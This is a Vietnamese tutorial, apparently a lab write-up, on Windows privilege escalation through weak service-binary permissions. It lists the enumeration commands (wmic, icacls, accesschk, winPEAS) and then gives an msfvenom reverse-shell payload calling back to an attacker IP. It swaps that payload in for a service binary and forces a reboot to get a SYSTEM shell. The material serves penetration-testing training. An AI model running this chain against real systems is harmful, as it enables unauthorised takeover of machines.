# Weak Service File Permissions
Tôi đã có được chỗ đứng trên máy mục tiêu với tư cách là người dùng tiêu chuẩn bob

![image](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/df3a329e-22e3-4ce9-bbd5-36a2ec6512dc)

## Hunting for Non-Standard Services

Có nhiều cách để chúng ta có thể tìm kiếm các dịch vụ thực thi từ các thư mục có quyền yếu; tuy nhiên, để tìm kiếm các quyền truy cập tệp yếu, trước tiên chúng tôi phải tìm kiếm mọi dịch vụ đang thực thi từ các vị trí không chuẩn trên hệ thống. Lý do cho điều này là vì các dịch vụ thực thi từ các vị trí không chuẩn sẽ tạo cơ hội tốt nhất cho chúng tôi tìm ra các quyền dịch vụ yếu.

Chúng ta có thể sử dụng lệnh **wmic** sau để tìm bất kỳ dịch vụ nào đang thực thi từ các vị trí không chuẩn:

```
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\"
```

![image-229](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/1221c128-a378-4f81-87dc-bec721e93a16)

Trong lệnh trên, tôi đã sử dụng wmic để truy vấn các dịch vụ và chỉ lấy các trường mà chúng tôi quan tâm. Chúng tôi cũng sử dụng option **/v** để bỏ qua mọi kết quả từ các thư mục bắt đầu bằng **C:\Windows** vì ta có thể sẽ không có quyền ghi vào các thư mục đó.

Ngoài ra, lệnh tương đương từ lời nhắc PowerShell sẽ là:

```
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike "C:\Windows*" } | select Name,DisplayName,StartMode,PathName
```

![image-230](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/a5b258c5-6adb-44c4-b508-82d0dbece14b)

Điều này cho chúng ta biết rằng có một dịch vụ có tên **Juggernaut** bắt đầu bằng cách thực thi tệp nhị phân **C:\Program Files\Juggernaut\Juggernaut.exe** và dịch vụ này là dịch vụ tự động khởi động.

Trước đó chúng tôi đã liệt kê rằng chúng tôi đã bật **SeShutdownPrivilege**, điều đó có nghĩa là chúng tôi sẽ có thể “khởi động lại” chương trình bằng cách khởi động lại máy.

## Săn lùng quyền đối với tệp dịch vụ yếu

### Liệt kê các quyền của tệp dịch vụ yếu – icacls

Sau khi tìm thấy một dịch vụ thú vị (không phải mặc định) thực thi từ một vị trí không chuẩn, chúng tôi cần tìm hiểu xem liệu chúng tôi có thể khai thác dịch vụ này hay không bằng cách kiểm tra quyền của thư mục và tệp.

Để thực hiện việc này, chúng ta có thể sử dụng lệnh **icacls** , đây là lệnh tích hợp được sử dụng để kiểm tra quyền của ACL thư mục và tệp.

Các quyền mà chúng tôi đang tìm kiếm trên thư mục là một trong ba quyền sau:

- (F) Kiểm soát hoàn toàn
- (M) Sửa đổi
- (W) Viết

Các quyền của người dùng / nhóm mà chúng tôi đang tìm kiếm như sau:

- Người dùng cụ thể mà chúng tôi hiện đang đăng nhập với tên (%USERNAME%)
- Authenticated Users
- Everyone
- BUILTIN\Users
- NT AUTHORITY\INTERACTIVE


Để xem các quyền trên thư mục C:\Program Files\Juggernaut, chúng ta có thể sử dụng lệnh sau:

```
icacls "C:\Program Files\Juggernaut"
```
![image-231](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/15987d0d-bf71-49d7-a168-68200129ebc8)

Điều này cho thấy BUILTIN\Users có (F) Toàn quyền kiểm soát thư mục này. Sau đó, điều này có thể có nghĩa là chúng tôi cũng sẽ có Toàn quyền kiểm soát nhị phân dịch vụ vì nó đã kế thừa các quyền của thư mục. Chúng tôi có thể xác nhận điều này bằng cách kiểm tra nhị phân bằng icacls, như vậy:

```
icacls "C:\Program Files\Juggernaut\Juggernaut.exe"
```
![image-232](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/eac92726-2614-4bb9-bf78-8628fb73a827)

Điều này có nghĩa là tôi có thể toàn quyền kiểm soát dịch vụ này bằng cách thay thế tệp nhị phân ban đầu bằng thứ gì đó độc hại.

### Liệt kê các quyền của tệp dịch vụ yếu – Accesschk

Trước khi tải bất kỳ công cụ nào lên nạn nhân, chúng ta cần liệt kê kiến trúc để có thể chuyển giao các công cụ phù hợp cho công việc. Chúng ta có thể thực hiện việc này bằng lệnh systeminfo , như sau:

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```
![image-233](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/539de133-fbc6-44ab-8f35-c1c7853201a6)

Ở đây chúng ta có thể thấy máy này đang chạy Windows 10 Pro – Build 18362 – Version 1903 và có kiến trúc x64.
Vì chúng tôi đã liệt kê rằng đây là vòm x64 nên chúng tôi có thể tiến hành chuyển bản sao của **accesschk64.exe** cho nạn nhân
Bắt đầu với quyền trên thư mục, chúng ta có thể sử dụng lệnh sau:

```
.\accesschk64.exe -wvud "C:\Program Files\Juggernaut" -accepteula
```
![image-235](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/f4a34beb-93b2-4b72-8720-f6fa872d5666)

Ở đây chúng ta có thể thấy rất giống với đầu ra icacls mà nhóm **BUILTIN\Users** có **FILE_FULL_ACCESS** , có nghĩa là **“Toàn quyền kiểm soát”**.

Chúng ta cũng có thể kiểm tra tệp thực thi bằng cách bỏ cờ '-d' rồi thêm tệp thực thi vào đường dẫn tệp, như sau:

```
.\accesschk64.exe -wvu "C:\Program Files\Juggernaut\Juggernaut.exe" -accepteula
```
![image-236](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/78010700-390e-44c4-a4b5-123718253d82)

Bây giờ chúng ta đã biết cách liệt kê các quyền của thư mục yếu bằng cách sử dụng các kỹ thuật thủ công và sử dụng Accesschk, hãy xem cách chúng ta có thể tìm kiếm các dịch vụ không chuẩn và các quyền đối với tệp dịch vụ yếu cùng một lúc bằng các công cụ.

### winPEAS

Vì chúng tôi đã chuyển winPEAS cho nạn nhân nên chúng tôi có thể tiến hành quét toàn bộ (không có công tắc) và sau đó xem xét đầu ra để tìm xem có dịch vụ nào dễ bị tấn công do quyền truy cập tệp dịch vụ yếu hay không.

winPEAS có rất nhiều đầu ra, vì vậy chìa khóa để không bị lạc là biết thông tin nhất định sẽ nằm ở đâu. Đối với các quyền dịch vụ yếu, chúng tôi muốn kiểm tra danh mục Thông tin dịch vụ . Điều này sẽ cung cấp cho chúng tôi thông tin về tên dịch vụ, đường dẫn đến tệp nhị phân dịch vụ và loại chế độ bắt đầu.

![image-241](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/2df78a90-3c56-453a-b65c-58bfef3b72bc)

Điều này cho chúng tôi biết mọi thứ chúng tôi cần biết để khai thác dịch vụ này. Nó cho thấy rằng chúng tôi có quyền ghi trên tệp thực thi và chương trình này là chương trình tự động khởi động.

Do đây là một lỗ hổng dịch vụ yếu nên winPEAS cũng sẽ thực sự gợi ý về lỗ hổng này trong phần Thông tin ứng dụng .

![image-242](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/9a16a16f-9e7f-4c9f-9627-8a1ee42e2122)

## Khai thác quyền của tệp dịch vụ yếu để lấy SYSTEM Shell

Bây giờ chúng ta đã thấy nhiều cách để tìm kiếm các dịch vụ không chuẩn và liệt kê các quyền đối với tệp dịch vụ, tất cả những gì còn lại cần làm là khai thác dịch vụ để lấy shell HỆ THỐNG.

Để khai thác điều này, chúng ta sẽ cần tạo một khai thác và đặt tên giống với tệp nhị phân dịch vụ ban đầu. Trong trường hợp này, tên tải trọng của chúng tôi sẽ là Juggernaut.exe.

Sau khi liệt kê rằng hệ thống này có vòm x64 và dịch vụ mà chúng tôi tìm thấy nằm trong thư mục “Tệp chương trình”, chúng tôi có thể dễ dàng tăng tải trọng 64 bit bằng cách sử dụng **msfvenom** và lệnh sau:

```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=172.16.1.30 -a x64 --platform Windows -f exe -o Juggernaut.exe
```
![image-244](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/bcd1409d-cc38-4dfc-907c-c39f09654672)

Nếu chúng tôi thấy dịch vụ này chạy từ thư mục Tệp chương trình (x86), chúng tôi có thể muốn xem xét việc tạo tệp thực thi 32 bit vì dịch vụ 64 bit có thể không hoạt động cho dịch vụ.

Với “dịch vụ” mới sáng bóng có thể thực thi được của chúng tôi đã sẵn sàng hoạt động, chúng tôi cần chuyển nó cho nạn nhân.

![image-245](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/cb1c0c33-f891-450b-be3c-44309ff0a95d)

Trọng tải của chúng tôi hiện đang ở trên nạn nhân; tuy nhiên, trước khi di chuyển tệp vào thư mục C:\Program Files\Juggernaut, chúng ta cần sao lưu tệp nhị phân gốc,

```
move "C:\Program Files\Juggernaut\Juggernaut.exe" "C:\Program Files\Juggernaut\Juggernaut.exe.BAK"
```

![image-246](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/8b180e6a-df84-4a92-a2a8-f2b220f2892a)

Tuyệt vời! Tệp nhị phân ban đầu đã được sao lưu, bây giờ tất cả những gì chúng ta cần làm là chuyển tải trọng của mình sang thư mục Juggernaut và khởi động lại hệ thống.

Nhưng trước tiên, chúng ta cần khởi động trình nghe netcat trên máy tấn công của mình trên cổng 443 để bắt shell SYSTEM.

![image-247](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/2e979805-1c33-4040-963e-6f0895dda876)

Được rồi, hãy kết thúc chuyện này! Sử dụng hai lệnh sau, chúng tôi sẽ đặt tải trọng của mình vào thư mục Juggernaut và sau đó khởi động lại máy.

```
move C:\temp\Juggernaut.exe "C:\Program Files\Juggernaut"

shutdown /r /t 0 /f
```
![image-248](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/1965089c-36ee-4dba-bce4-d1f789ceae9d)

Chúng tôi thấy rằng chúng tôi đã được khởi động từ hệ vỏ hiện tại, điều đó có nghĩa là hệ thống đã khởi động lại; và sau khoảng 20 giây, chúng tôi nhận được shell HỆ THỐNG trên trình nghe của mình!

![image-249](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/3cb1b2ba-40d3-4bd2-9f30-1f068ddb442f)
